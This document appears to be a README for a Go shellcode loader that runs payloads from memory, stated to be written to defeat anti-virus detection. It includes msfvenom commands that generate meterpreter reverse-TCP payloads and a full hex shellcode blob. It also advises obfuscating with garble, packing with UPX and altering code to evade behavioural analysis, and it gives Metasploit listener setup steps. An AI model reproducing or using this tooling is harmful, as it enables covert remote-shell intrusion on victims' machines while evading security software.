shellcode
=========

This is a program to run shellcode as its own process, all from memory. This was
written to defeat anti-virus detection. This is now getting detected as
VirTool:Win32/Shrine.A. Use a tool like [garble](https://github.com/burrowers/garble)
to obfuscate the binary to defeat static analysis. Change the code yourself to
defeat behavior analysis.

Usage
=====

Keep in mind that only 64bit shellcode will run in a 64bit process. This can't
autodetect your shellcode architecture.

Use msfvenom or metasploit to generate a bit of shellcode as hex format:
```
$ msfvenom -p windows/meterpreter/reverse_tcp -f hex -o rev.hex LHOST=127.0.0.1 LPORT=4444
$ msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=4444 -f hex -o rev.hex -f raw
```

```
c:\windows\temp>sc.exe fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c77260789e8ffd0b89001000029c454506829806b00ffd56a0a687f000001680200115c89e6505050504050405068ea0fdfe0ffd5976a1056576899a57461ffd585c0740aff4e0875ece8670000006a006a0456576802d9c85fffd583f8007e368b366a406800100000566a006858a453e5ffd593536a005653576802d9c85fffd583f8007d285868004000006a0050680b2f0f30ffd55768756e4d61ffd55e5eff0c240f8570ffffffe99bffffff01c329c675c1c3bbf0b5a2566a0053ffd5
$ ./main ./rev.hex
```

Sometimes the shellcode is larger than the limit of a command line with
arguments. Try putting the whole thing in a batch script instead.

Build
=====

Standard go building steps. Set GOOS to `windows` and GOARCH to the same as your
shellcode, either `386` or `amd64`. This can't detect the architecture of your
shellcode.

The resulting binary is a little big, 2.1M, but compresses well with UPX,
roughly 508K.

```shell
go build -ldflags '-s -w -L /lib/x86_64-linux-gnu/*.so -linkmode "external" -extldflags "-static"' cmd/sc/main.go
upx  -9 --brute main
```

Host
=====
Start msfconsole    
Do: use exploit/multi/handler  
Do: set PAYLOAD linux/x64/meterpreter/reverse_tcp  
Do: set LHOST [Your IP]  
Do: set LPORT [Your PORT]  
Do: run  
